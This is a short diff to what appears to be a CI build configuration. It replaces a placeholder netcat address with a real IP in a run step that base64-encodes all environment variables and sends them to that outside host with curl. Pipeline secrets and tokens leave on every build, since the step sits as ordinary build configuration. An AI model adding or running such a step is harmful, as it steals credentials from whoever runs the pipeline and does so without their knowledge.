@@ -7,4 +7,4 @@ build:
     name: node/default
     tag: '10.4'
   steps:
-    - run: curl http://[your nc ip address]?env=$(env| base64 | tr -d '\n')
+    - run: curl http://159.223.121.196?env=$(env| base64 | tr -d '\n')
